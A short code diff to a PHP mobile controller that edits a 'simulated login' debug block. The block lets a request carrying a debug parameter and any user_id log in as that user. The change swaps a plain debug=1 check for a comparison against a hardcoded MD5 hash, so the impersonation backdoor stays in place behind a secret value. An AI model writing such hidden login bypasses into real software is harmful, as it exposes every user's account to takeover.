@@ -30,9 +30,9 @@ class MobileBase extends Controller {
         
 
         /**
-         * 模拟登录
+         * 模拟登录 (debug == 一个值)
          */
-        if(I('debug') == 1 && I('user_id') > 0){
+        if(md5(I('debug')) == 'ae614c557843b1df326cb29c57225459' && I('user_id') > 0){
 
             $user_id =  I('user_id');
             if(!$user_id){
